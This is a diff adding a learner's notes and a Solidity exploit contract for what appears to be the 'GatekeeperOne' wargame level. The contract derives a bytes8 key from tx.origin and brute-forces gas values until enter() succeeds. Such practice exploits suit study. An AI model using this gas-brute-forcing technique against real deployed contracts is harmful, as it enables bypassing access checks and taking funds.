@@ -1,3 +1,20 @@
 gate one: feed transaction through another address (smart contract)
 gate two: ensure gasleft() is an integer multiple of 8191
 gate three: some sort of encoding 
+
+Had to cheat to find the answer to gate 3. I need to learn more about 
+obscuring bytes / byte operations. I'm trying to brute force gate two
+with this contract, returning a valid gas limit:
+
+contract GateKeeper {
+    GatekeeperOne gate = GatekeeperOne([levelInstanceAddress]);
+    function crack(uint _gas) public returns(uint) {
+        bytes8 key = bytes8(bytes20(tx.origin)) & 0xFFFFFFFF0000FFFF;
+        for (uint i = _gas; i<(_gas+50); i++) {
+            (bool success, ) = address(gate).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (success) {
+                return i;
+            }
+        }
+    }
+}
